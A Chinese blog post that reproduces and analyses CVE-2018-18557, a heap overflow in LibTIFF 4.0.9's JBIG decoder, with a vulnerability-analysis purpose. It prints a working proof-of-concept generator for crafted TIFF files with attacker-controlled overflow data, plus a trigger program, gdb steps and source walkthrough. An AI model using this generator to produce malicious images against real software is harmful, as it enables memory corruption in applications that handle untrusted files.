# 分析 CVE-2018-18557 与复现 - 白鹭鹭鹭 - 博客园

> 原文：[`www.cnblogs.com/slll/p/15905003.html`](https://www.cnblogs.com/slll/p/15905003.html)

# 前言

[cve 描述](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18557)：

> LibTIFF 4.0.9 (with JBIG enabled) decodes arbitrarily-sized JBIG into a buffer, ignoring the buffer size, which leads to a tif_jbig.c JBIGDecode out-of-bounds write.

该 cve 发生在 LibTIFF 4.0.9 版本中，由于在解码 JBIG 的时候没有对 size 进行验证，在 JBIGDecode 函数中会造成大量数据的堆溢出

# 编译安装

为了复现该漏洞，需要使得 LibTIFF 支持 jbig 解码功能，所以需要先安装 libjbig-dev

`sudo apt-get install libjbig-dev`

然后编译安装 LibTIFF 4.0.9，[链接在此](https://www.exploit-db.com/apps/54bad211279cc93eb4fca31ba9bfdc79-tiff-4.0.9.tar.gz)

`./configure --prefix=/xxxx/xxx/build`

`make && make install`

# tiff 文件格式

TIFF 是 Tagged Image File Format 的缩写 ， 标签图像文件格式

TIFF 与其他文件格式最大的不同在于除了图像数据，它还可以记录很多图像的其他信息。它记录图像数据的方式也比较灵活， 理论上来说， 任何其他的图像格式都能为 TIFF 所用， 嵌入到 TIFF 里面。比如 JPEG， Lossless JPEG， JPEG2000 和任意数据宽度的原始无压缩数据都可以方便的嵌入到 TIFF 中去。由于它的可扩展性， TIFF 在数字影响、遥感、医学等领域中得到了广泛的应用。TIFF 文件的后缀是.tif 或者.tiff

Tiff 的结构大概是这样的组成：

文件头信息区（IFH）、图像文件目录（IFD）和图像数据区

而 IFD 又包含了很多 DE（ Directory Entry ）

简单的说，IFD 用于存储描述图像的属性信息，如图像的 长、宽、分辨率等 ，DE 就是一个个不同属性描述。而图像数据区则直接存储像素信息的二进制数据

这里只做简单介绍，详细可见： [`www.jianshu.com/p/ff32eb09ed3d`](https://www.jianshu.com/p/ff32eb09ed3d)

可以下载他的 tiff 例子，载入 010editor 中跟着看，对了解 tiff 非常有帮助

# 触发漏洞

参考了一波 [`www.exploit-db.com/exploits/45694`](https://www.exploit-db.com/exploits/45694)

但发现这上面所谓的 poc，只能说是一个用于生成触发漏洞 tiff 文件的代码而已，那具体怎么使用 libtiff 的代码才能触发漏洞，这还得俺自己动手写

通过调试+源码查看，分析函数调用，真正的 poc 如下

```
#include #include "tiffio.h"

int main(int argc, char const *argv[])
{
    if (argc<2)
    {
        printf("usage: %s <tif file="">\n",argv[0]);
        return -1;
    }

    TIFF* tif = TIFFOpen(argv[1], "r");
    if (tif) {
    tdata_t buf;
    tstrip_t strip;

    buf = _TIFFmalloc(TIFFStripSize(tif));
    for (strip = 0; strip < TIFFNumberOfStrips(tif); strip++)
        TIFFReadEncodedStrip(tif, strip, buf, (tsize_t) -1);
    puts("it will crash,because heap space has been overflow:\n");
    _TIFFfree(buf);//<<< crash!

    TIFFClose(tif);
    }
}
//gcc ./poc.c -g -o poc -I ./build/include/ -L ./build/lib/ ./build/lib/libtiff.a -ljbig -lm -lz</tif> 
```

编译 poc：

`gcc ./poc.c -g -o poc -I ./build/include/ -L ./build/lib/ ./build/lib/libtiff.a -ljbig -lm -lz`

这里 使用局部静态链接，只静态链接 libtiff，而对其他库如 libjbig、libmath、zlibc 等使用动态链接，这是为了在调试的时候能直接源码级调试

然后编译 exp-db 的“testcase_generator.c”

`gcc testcase_generator.c -g -o testcase_generator -ljbig`

```
#include #include <stdio.h>#include <sys stat.h="">#include <stdint.h>#include "jbig.h"

void output_bie(unsigned char *start, size_t len, void *file)
{
  fwrite(start, 1, len, (FILE *) file);

  return;
}

int main(int argc, char**argv)
{
  FILE* inputfile = fopen(argv[1], "rb");
  FILE* outputfile = fopen(argv[2], "wb");

  // Write the hacky TIF header.
  unsigned char buf[] = {
    0x49, 0x49, // Identifier.
    0x2A, 0x00, // Version.
    0xCA, 0x03, 0x00, 0x00, // First IFD offset.
    0x32, 0x30, 0x30, 0x31,
    0x3a, 0x31, 0x31, 0x3a,
    0x32, 0x37, 0x20, 0x32,
    0x31, 0x3a, 0x34, 0x30,
    0x3a, 0x32, 0x38, 0x00,
    0x38, 0x00, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00,
    0x38, 0x00, 0x00, 0x00,
    0x00, 0x01, 0x00, 0x00
  };
  fwrite(&(buf[0]), sizeof(buf), 1, outputfile);

  // Read the inputfile.
  struct stat st;
  stat(argv[1], &st);
  size_t size = st.st_size;
  unsigned char* data = malloc(size);
  fread(data, size, 1, inputfile);

  // Calculate how many "pixels" we have in the input.
  unsigned char *bitmaps[1] = { data };
  struct jbg_enc_state se;

  jbg_enc_init(&se, size * 8, 1, 1, bitmaps, output_bie, outputfile);
  jbg_enc_out(&se);
  jbg_enc_free(&se);

  // The raw JBIG data has been written, now write the IFDs for the TIF file.
  unsigned char ifds[] = {
    0x0E, 0x00, // Number of entries.     +0

    0xFE, 0x00, // Subfile type.          +2
    0x04, 0x00, // Datatype: LONG.        +6
    0x01, 0x00, 0x00, 0x00, // 1 element. +10
    0x00, 0x00, 0x00, 0x00, // 0          +14
    0x00, 0x01, // IMAGE_WIDTH            +16
    0x03, 0x00, // Datatype: SHORT.       +18
    0x01, 0x00, 0x00, 0x00, // 1 element. +22
    0x96, 0x00, 0x00, 0x00, // 96 hex width.  +26
    0x01, 0x01, // IMAGE_LENGTH           +28
    0x03, 0x00, // SHORT                  +30
    0x01, 0x00, 0x00, 0x00, // 1 element  +34
    0x96, 0x00, 0x00, 0x00, // 96 hex length. +38
    0x02, 0x01, // BITS_PER_SAMPLE        +40
    0x03, 0x00, // SHORT                  +42
    0x01, 0x00, 0x00, 0x00, // 1 element  +46
    0x01, 0x00, 0x00, 0x00, // 1          +50
    0x03, 0x01, // COMPRESSION            +52
    0x03, 0x00, // SHORT                  +54
    0x01, 0x00, 0x00, 0x00, // 1 element  +58
    0x65, 0x87, 0x00, 0x00, // JBIG       +62
    0x06, 0x01, // PHOTOMETRIC            +64
    0x03, 0x00, // SHORT                  +66
    0x01, 0x00, 0x00, 0x00, // 1 element  +70
    0x00, 0x00, 0x00, 0x00,          // / +74
    0x11, 0x01, // STRIP_OFFSETS          +78
    0x04, 0x00, // LONG                   +80
    0x13, 0x00, 0x00, 0x00, // 0x13 elements  +82
    0x2C, 0x00, 0x00, 0x00, // Offset 2C in file  +86
    0x15, 0x01, // SAMPLES_PER_PIXEL      +90
    0x03, 0x00, // SHORT                  +92
    0x01, 0x00, 0x00, 0x00, // 1 element  +94
    0x01, 0x00, 0x00, 0x00, // 1          +98
    0x16, 0x01, // ROWS_PER_STRIP         +102
    0x04, 0x00, // LONG                   +104
    0x01, 0x00, 0x00, 0x00, // 1 element  +106
    0xFF, 0xFF, 0xFF, 0xFF, // Invalid    +110
    0x17, 0x01, // STRIP_BYTE_COUNTS      +114
    0x04, 0x00, // LONG                   +116
    0x13, 0x00, 0x00, 0x00, // 0x13 elements  +118
    0xC5, 0xC0, 0x00, 0x00, // Read 0xC0C5 bytes for the strip? +122
    0x1A, 0x01, // X_RESOLUTION
    0x05, 0x00, // RATIONAL
    0x01, 0x00, 0x00, 0x00, // 1 element
    0x1C, 0x00, 0x00, 0x00,
    0x1B, 0x01, // Y_RESOLUTION
    0x05, 0x00, // RATIONAL
    0x01, 0x00, 0x00, 0x00, // 1 Element
    0x24, 0x00, 0x00, 0x00,
    0x28, 0x01, // RESOLUTION_UNIT
    0x03, 0x00, // SHORT
    0x01, 0x00, 0x00, 0x00, // 1 Element
    0x02, 0x00, 0x00, 0x00, // 2
    0x0A, 0x01, // FILL_ORDER
    0x03, 0x00, // SHORT
    0x01, 0x00, 0x00, 0x00, // 1 Element
    0x02, 0x00, 0x00, 0x00, // Bit order inverted.
    0x00, 0x00, 0x00, 0x00 };

  // Adjust the offset for the IFDs.
  uint32_t ifd_offset = ftell(outputfile);
  fwrite(&(ifds[0]), sizeof(ifds), 1, outputfile);
  fseek(outputfile, 4, SEEK_SET);
  fwrite(&ifd_offset, sizeof(ifd_offset), 1, outputfile);

  // Adjust the strip size properly.
  fseek(outputfile, ifd_offset + 118, SEEK_SET);
  fwrite(&ifd_offset, sizeof(ifd_offset), 1, outputfile);

  fclose(outputfile);
  fclose(inputfile);
  return 0;
}</stdint.h></sys></stdio.h> 
```

它主要的作用是生成一个可发生堆溢出的 tiff 文件，且溢出内容可以由我们控制，如创建一个文本文件 text，其内容大量填充为 aaaa...

执行`./testcase_generator text testcase.tif`

这就会使得大量 aaa 数据通过 JBIG 压缩方式被写入 testcase.tif 文件中

接着执行 poc：

`./poc ./testcase.tif`

成功触发漏洞：

![image](https://xzfile.aliyuncs.com/media/upload/picture/20200413144726-a3178194-7d52-1.png)

这里报错是，free 的时候发现该 chunk 的 next size 位异常，这种情况实际上是因为堆溢出太多数据，导致后续 free 的时候很多 chunk 被溢出篡改了数据，所以产生了这种报错

# 漏洞分析

## gdb 调试

根据 cve 信息，我这里直接定位到 JBIGDecode 函数，给他整个断点

![image](https://xzfile.aliyuncs.com/media/upload/picture/20200413144739-aa9d4cfa-7d52-1.png)

然后一步步 nextcall

直到执行`_TIFFmemcpy`前

![image](https://xzfile.aliyuncs.com/media/upload/picture/20200413144751-b2332228-7d52-1.png)

可以看到这个第三个参数就尼玛离谱，完全没有任何检查，该长度就是之前的 text 文本文件中的字符数量，也就是字符 a 的个数

然后来康康这个堆空间 0x657b60 的大小，只有 0xb30

![image](https://xzfile.aliyuncs.com/media/upload/picture/20200413144807-bbce6202-7d52-1.png)

而`_TIFFmemcpy`的 length 是 0x26d0，巨大的堆溢出就是这么产生的

## 源码分析

从 poc.c 结合 libtiff 来康康完整的函数调用链：

首先是`TIFFReadEncodedStrip(tif, strip, buf, (tsize_t) -1);`

在源码中，TIFFReadEncodedStrip 会调用 JBIGDecode 函数

```
TIFFReadEncodedStrip(TIFF* tif, uint32 strip, void* buf, tmsize_t size)
{
    static const char module[] = "TIFFReadEncodedStrip";
    TIFFDirectory *td = &tif->tif_dir;
    tmsize_t stripsize;
    uint16 plane;

    stripsize=TIFFReadEncodedStripGetStripSize(tif, strip, &plane);
    if (stripsize==((tmsize_t)(-1)))
        return((tmsize_t)(-1));

    /* shortcut to avoid an extra memcpy() */
    if( td->td_compression == COMPRESSION_NONE &&
        size!=(tmsize_t)(-1) && size >= stripsize &&
        !isMapped(tif) &&
        ((tif->tif_flags&TIFF_NOREADRAW)==0) )
    {
        if (TIFFReadRawStrip1(tif, strip, buf, stripsize, module) != stripsize)
            return ((tmsize_t)(-1));

        if (!isFillOrder(tif, td->td_fillorder) &&
            (tif->tif_flags & TIFF_NOBITREV) == 0)
            TIFFReverseBits(buf,stripsize);

        (*tif->tif_postdecode)(tif,buf,stripsize);
        return (stripsize);
    }

    if ((size!=(tmsize_t)(-1))&&(sizetif_decodestrip)(tif,buf,stripsize,plane)<=0)//调用 JBIGDecode
        return((tmsize_t)(-1));
    (*tif->tif_postdecode)(tif,buf,stripsize);
    return(stripsize);
} 
```

这里没有明显出现 JBIGDecode 函数名，但其实是用了函数指针的方法调用的

在 TIFFInitJBIG 函数中声明了该函数指针：

```
int TIFFInitJBIG(TIFF* tif, int scheme)
{
    assert(scheme == COMPRESSION_JBIG);

    /*
 * These flags are set so the JBIG Codec can control when to reverse
 * bits and when not to and to allow the jbig decoder and bit reverser
 * to write to memory when necessary.
 */
    tif->tif_flags |= TIFF_NOBITREV;
    tif->tif_flags &= ~TIFF_MAPPED;

    /* Setup the function pointers for encode, decode, and cleanup. */
    tif->tif_setupdecode = JBIGSetupDecode;
    tif->tif_decodestrip = JBIGDecode;//<<<声明
    tif->tif_setupencode = JBIGSetupEncode;
    tif->tif_encodestrip = JBIGEncode;

    return 1;
}

```

最后来看 JBIGDecode 函数

```
static int JBIGDecode(TIFF* tif, uint8* buffer, tmsize_t size, uint16 s)
{
    struct jbg_dec_state decoder;
    int decodeStatus = 0;
    unsigned char* pImage = NULL;
    (void) size, (void) s;

    if (isFillOrder(tif, tif->tif_dir.td_fillorder))
    {
        TIFFReverseBits(tif->tif_rawdata, tif->tif_rawdatasize);
    }

    jbg_dec_init(&decoder);

#if defined(HAVE_JBG_NEWLEN)
    jbg_newlen(tif->tif_rawdata, (size_t)tif->tif_rawdatasize);
#endif /* HAVE_JBG_NEWLEN */

    decodeStatus = jbg_dec_in(&decoder, (unsigned char*)tif->tif_rawdata,
                  (size_t)tif->tif_rawdatasize, NULL);
    if (JBG_EOK != decodeStatus)
    {
        TIFFErrorExt(tif->tif_clientdata,
                 "JBIG", "Error (%d) decoding: %s",
                 decodeStatus,
#if defined(JBG_EN)
                 jbg_strerror(decodeStatus, JBG_EN)
#else
                 jbg_strerror(decodeStatus)
#endif
                 );
        jbg_dec_free(&decoder);
        return 0;
    }

    pImage = jbg_dec_getimage(&decoder, 0);
    _TIFFmemcpy(buffer, pImage, jbg_dec_getsize(&decoder));
    jbg_dec_free(&decoder);
    return 1;
}

_TIFFmemcpy(void* d, const void* s, tmsize_t c)
{
    memcpy(d, s, (size_t) c);
}

```

可以看到，这里对`jbg_dec_getsize(&decoder)`的返回值是完全没有检查的，而该函数是直接封装到 libjbig 中的，它会直接从 tiff 文件中读取长度，因此过长的长度也不会被检查出来，由此引发堆溢出的漏洞